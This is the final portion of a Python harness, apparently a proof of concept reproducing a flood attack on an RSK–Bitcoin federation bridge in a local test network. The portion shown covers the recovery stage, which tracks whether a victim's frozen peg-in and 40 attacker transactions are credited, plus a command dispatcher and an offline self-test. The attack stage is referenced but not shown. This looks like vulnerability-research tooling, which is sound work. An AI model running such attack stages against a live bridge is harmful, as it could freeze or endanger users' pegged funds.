    The previous version of this stage only waited, mined nothing, and then
    blamed the federator because the Bridge's Bitcoin height had not moved --
    a signal that could not move while no Bitcoin block was being mined.
    """
    st = load_state()
    caller = CALLER[0] or federation_caller()
    offsets = {f: o for f, o in log_offsets().items()
               if f.endswith(os.path.join("node-federator1", "rsk.log"))}
    if not offsets:
        offsets = log_offsets()

    age, created = active_federation_age()
    log("[recover] active federation created at RSK block %d, age %d blocks"
        % (created, age))
    log("          its funds may migrate once it is 300 blocks old "
        "(activation 150 + migration 150)")
    if age < 300:
        log("          %d blocks to go (~%d min at one block per second)"
            % (300 - age, max(1, round((300 - age) / 60))))

    start = int(rsk("eth_blockNumber"), 16)
    deadline = start + 420
    last_call = -100
    last_print = 0.0

    while True:
        size = retiring_size()
        blk = int(rsk("eth_blockNumber"), 16)
        if size <= 0:
            log("[recover] the retiring federation is gone at RSK block %d" % blk)
            break
        if blk > deadline:
            age, _ = active_federation_age()
            for line in log_since(r"processFundsMigration|Retiring federation|migration",
                                  offsets)[-6:]:
                log("    " + line.strip()[:200])
            raise RuntimeError(
                "recovery: the retiring federation (size %d) is still there after %d "
                "blocks. The active federation is %d blocks old; migration starts at 300."
                % (size, blk - start, age))

        # one Bridge call every 8 blocks: it is what builds the migration tx and
        # what finally clears the retiring federation
        if blk - last_call >= 8:
            try:
                send_update_collections(caller)
            except Exception as e:
                log("             block %d: updateCollections failed (%s), retrying in 8 "
                    "blocks" % (blk, str(e)[:90]))
            last_call = blk
            mine(2)

        mine(1)
        time.sleep(1)

        now = time.time()
        if now - last_print > 25:
            last_print = now
            age, _ = active_federation_age()
            log("             block %d: retiring size %d, active federation age %d/300"
                % (blk, size, age))

    # ---- the effect that matters: the frozen peg-ins get credited ----------
    vic = st["victim_rsk_address"]
    log("[recover] retiring federation is gone; the 40 flood txs and the victim's "
        "peg-in are now valid peg-ins")
    t0 = time.time()
    while time.time() - t0 < 240:
        bal = balance(vic)
        if bal > 0:
            log("[recover] victim credited after %ds: %s wei" % (time.time() - t0, bal))
            break
        mine(1)
        time.sleep(3)
    else:
        log("[recover] WARNING: the victim is still not credited 240s after the retiring "
            "federation disappeared")

    st = load_state()
    stage_measure("after")
    last = st["measurements"][-1]
    log("[recover] victim final balance %s wei" % balance(vic))
    log("[recover] processed: %d/40 attack txs" % last["attacker_processed"])


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 1
    cmd = sys.argv[1]
    if cmd == "peg":
        stage_peg()
    elif cmd == "federation":
        stage_federation()
    elif cmd == "attack":
        stage_attack()
    elif cmd == "measure":
        stage_measure(sys.argv[2] if len(sys.argv) > 2 else "t")
    elif cmd == "recover":
        stage_recover()
    elif cmd == "federator-check":
        gen = sys.argv[2] if len(sys.argv) > 2 else "federator1"
        need_height = "--height" in sys.argv
        node = rsk_b if "--node-b" in sys.argv else rsk
        federator_check(gen, need_height=need_height, node=node)
    elif cmd == "selftest":
        selftest()
    else:
        print("unknown stage", cmd)
        return 1
    return 0


def selftest():
    """Offline checks that do not need any node."""
    ok = True
    if keccak256(b"").hex() != "c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470":
        log("FAIL keccak256('')"); ok = False
    if keccak256(b"transfer(address,uint256)").hex()[:8] != "a9059cbb":
        log("FAIL erc20 selector"); ok = False
    if "0x" + keccak256(PrivateKey(keccak256(b"auth-a")).public_key.format(False)[1:])[-20:].hex() != \
            "0x5252403bca6ac3c104abdd320a736fa38282045d":
        log("FAIL auth-a address"); ok = False
    # a ground tx really lands in bin 0
    raw, txid = sign_tx(ATTACKER, b"\x11" * 32, 0, p2pkh_script(ATTACKER.public_key.format(True)),
                        [(500_000, p2pkh_script(AUTH_A.public_key.format(True)))])
    if bin_index(txid, 0x3FF) != bin_index(txid, 0x3FF):
        log("FAIL bin_index"); ok = False
    log("selftest: %s" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
